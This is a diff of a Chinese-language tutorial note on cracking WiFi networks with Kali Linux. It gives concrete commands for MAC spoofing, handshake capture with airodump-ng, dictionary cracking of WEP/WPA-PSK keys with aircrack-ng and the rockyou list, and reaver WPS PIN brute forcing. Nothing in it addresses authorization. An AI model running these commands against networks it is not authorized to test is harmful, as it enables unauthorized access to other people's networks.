@@ -13,6 +13,7 @@ tags:
 [无线安全专题01--kali破解WPA](https://www.jianshu.com/p/430ae3c978d9)。  
 [无线安全专题_破解篇02--kali破解pin码](https://www.jianshu.com/p/a8439e777af7)。  
 [Aircrack除破解WiFi密码外的趣味玩法](https://www.freebuf.com/articles/wireless/59809.html)。  
+[完全教程 Aircrack-ng破解WEP、WPA-PSK加密利器](http://netsecurity.51cto.com/art/201105/264844.htm)。  
 
 #### 查看无线网络
 用`ifconfig`或`ip addr`等命令查看网络接口：
@@ -36,7 +37,7 @@ root@KL:~# ip addr
     link/ether 1a:2b:3c:4d:5e:6f brd ff:ff:ff:ff:ff:ff
 root@KL:~#
 ```
-可知，此时有`wlan0`和`wlan1`这两个无线网卡。
+可知，此时有`wlan0`和`wlan1`两个无线网卡。
 
 #### 修改MAC地址
 ```shell
@@ -65,16 +66,17 @@ airmon-ng                 # 查看所有无线网卡的当前状态(查看是否
 #### 捕获握手包
 ```shell
 airodump-ng [options] <interface name>
--d <bssid>, --bssid <bssid>
-    It will only show networks, matching the given bssid.
--c <channel>[,<channel>[,...]], --channel <channel>[,<channel>[,...]]
-    Indicate the channel(s) to listen to. By default airodump-ng hop on all 2.4GHz channels.
--w <prefix>, --write <prefix>
-    Is the dump file prefix to use.
+--ivs                 : Save only captured IVs
+--write      <prefix> : Dump file prefix
+-w                    : same as --write
+--bssid     <bssid>   : Filter APs by BSSID
+--channel <channels>  : Capture on specific channels
 # 例
 airodump-ng wlan0mon  # 捕获WIFI范围内的无线信息
-airodump-ng --bssid 1a:2b:3c:4d:5e:6f --write ./testData wlan0mon  # 捕获握手包并保存到testData开头的文件中
+airodump-ng --ivs --bssid 1a:2b:3c:4d:5e:6f --write ./testData wlan0mon  # 捕获握手包并保存到testData开头的文件中
 ```
+备注：`--ivs`仅保存捕获的IVs报文。可以缩减文件大小。  
+备注：可以用`ivstools --convert data.cap data.ivs`把cap文件转为ivs文件以缩减大小。
 
 #### 解除认证攻击
 ```shell
@@ -130,6 +132,33 @@ STATION: (连到AP上(和)没有连到AP上)的client的MAC地址。
    Lost: 来自client的包的丢失的数量。
 ```
 
+#### 恢复WEP/WPA-PSK密码
+```
+aircrack-ng [options] <.cap / .ivs file(s)>
+-b <bssid> : target selection: access point's MAC
+-p <nbcpu> : # of CPU to use  (default: all CPUs)
+-q         : enable quiet mode (no status output)
+-l <file>  : write key to file
+-w <words> : path to wordlist(s) filename(s)
+             Here is a list of wordlists: 
+             http://www.aircrack-ng.org/doku.php?id=faq#where_can_i_find_good_wordlists
+# 例
+aircrack-ng -b AP的MAC -w 字典文件  cap文件或ivs文件
+```
+在[Aircrack-ng](http://www.aircrack-ng.org/)的[Windows](https://download.aircrack-ng.org/aircrack-ng-1.4-win.zip)能下载到`aircrack-ng.exe`程序。然后我们就可以在Windows下进行破解了。Windows下可以如下执行：
+```bat
+cd .\aircrack-ng-1.4-win\bin\32bit\
+aircrack-ng.exe -b 1A:2B:3C:4D:5E:6F -w C:\字典\dict.txt  D:/data/testData*.cap
+```
+
+#### KaliLinux自带的字典
+[wordlists | Penetration Testing Tools](https://tools.kali.org/password-attacks/wordlists)。  
+```shell
+字典路径:  /usr/share/wordlists/rockyou.txt.gz
+# 解压命令
+gunzip -c /usr/share/wordlists/rockyou.txt.gz > ./rockyou.txt
+```
+
 #### 爆破WPS的pin码
 扫描WIFI。WPS的Lck为No的都可以爆破试试。
 ```shell
@@ -149,4 +178,20 @@ reaver -i <interface> -b <target bssid> -vv
 -S, --dh-small                  Use small DH keys to improve crack speed
 # 例
 reaver -i wlan0mon -b 00:14:6C:7A:41:81 -S -v
+```
+
+#### 其他
+
+* 我该怎么装软件？  
+`Kali Linux`和`Ubuntu`都是`Debian`的分支。你可以`apt-get install gcc`安装软件。  
+
+* 怎么禁用`Automatic suspend`？
+```
+Automatic suspend
+Computer will suspend very soon because of inactivity.
+```
+The solution is to disable automatic suspend:
+```
+Open GNOME Control Center, go to Power tab (or simply gnome-control-center power)
+In Suspend & Power Button set Automatic suspend, to Off when Plugged In.
 ```
